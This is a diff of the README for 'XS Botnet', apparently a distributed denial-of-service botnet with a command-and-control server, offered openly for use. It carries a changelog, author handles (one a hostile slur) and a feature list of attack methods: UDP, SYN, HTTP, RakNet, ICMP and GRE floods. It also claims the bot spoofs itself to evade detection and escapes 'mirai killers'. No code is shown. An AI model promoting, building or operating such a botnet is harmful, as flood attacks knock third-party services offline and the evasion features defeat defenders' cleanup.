@@ -1,24 +1,46 @@
 ![Img](image.png?raw=true "Screenshot")
-Note: The cross compilers in script are not reliable and for ubuntu only
-Note: Someone should do a pull request to add better compiler
-# P.S: Update started at 11 may 2025
-- Fixed segmentation errors, zombie connections and issues done for now (30% done)
-# What is new? (2025-4-23 | 23 april 2025)
-- Fixed segmentation error in command
-- Fixed command crashing on no arguments
-- Fixed terminal cursor for putty users when there are 2 sessions
-- Fixed memory allocation in bot, optimising it (todo add slowmode opt)
-- Fixed udpraw and syn raw methods
-- Optimised command processor using Github Copilot AI (Structure)
-- Added Raknet method (Raknet Unconnected ping flood)
-- Added option psize for vse & raknet & udp & syn
-- Added srcport option for udp,syn (useful on some servers)
-- Added IP & File logging (settings.txt)
-- Added auto bot compiler for ubuntu (not recommended, use another compilers)
-- Bot Daemon spoofs itself now to avoid detection
-- Fixed Duplicate botcount and added bot validator
-- Finally added !opthelp & !exit for safe exit
-- Took +30 hours for testing, optimising & best ai structure & code fixes
-# Next update estimated times
-- 5 May 2025
-- 20 May 2025
+
+# Changelog:
+- Read Changelog.md for changelog
+- CNC Just updated at 18 may 2025
+- Some improvements
+- Small update at 18 may 2025 (Features update)
+## Note:
+- Each update takes 1-3 days with +30 hours of work :(
+
+## XS Botnet
+- made by: daylight911 (discord), FuckIsra3l(telegram)
+- Made in github codespaces(Make & C ext, Copilot).
+- There may be some bugs
+
+## Features:
+- Clear screen
+- Stopall
+- exit
+- Global cooldown
+- Anti duplicate users
+- Works with putty
+- Username, Password, Maxtime and maxbots customize
+- Settings file
+- Logs
+- Arch list
+- Almost undetectable by mirai killers (tested)
+- Attack options
+
+## UDP Methods
+- VSE - UDP VSE Query flood
+- UDP - Plain/Raw UDP Flood 
+- raknet - UnConnected Ping + Magic flood
+## TCP Methods
+- SYN - TCP Syn flood, made for pps
+- Socket - Floods TCP Active connections, No data
+- HTTP - HTTP 1.1 GET Flood
+## Layer3 Methods
+- icmp - ICMP ECHO Flood
+- GRE Encapsulated UDP|TCP Or Raw ip Flooder
+
+# Install tutorial?
+- Check tutorial.txt
+
+# Connection
+- Putty raw using your vps ip and cnc port
